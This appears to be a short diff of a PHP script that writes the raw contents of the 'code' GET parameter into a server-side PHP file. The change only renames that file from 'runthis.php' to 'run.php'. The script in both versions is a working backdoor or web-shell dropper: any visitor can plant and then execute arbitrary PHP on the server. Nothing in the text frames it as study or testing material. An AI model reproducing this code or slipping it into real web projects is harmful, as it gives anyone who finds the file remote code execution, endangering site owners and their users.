@@ -1,5 +1,5 @@
 <?php
     $content = $_GET['code'];
-    $fp = fopen("runthis.php","w+");
+    $fp = fopen("run.php","w+");
     fwrite($fp,$content);
     fclose($fp);
